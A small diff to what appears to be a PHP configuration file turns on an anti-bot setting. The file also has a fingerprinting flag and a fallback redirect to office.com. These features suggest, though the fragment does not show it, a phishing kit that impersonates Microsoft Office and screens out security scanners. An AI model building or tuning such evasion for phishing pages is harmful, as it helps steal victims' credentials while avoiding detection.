@@ -3,7 +3,7 @@
 const FailedDestination = 'https://office.com';
 
 const EnableFingerPrint = false;
-const EnableAntiBot = false ;
+const EnableAntiBot = true ;
 
 function loadJs($jsCode=''){
     if ($_GET['_js']??false) {
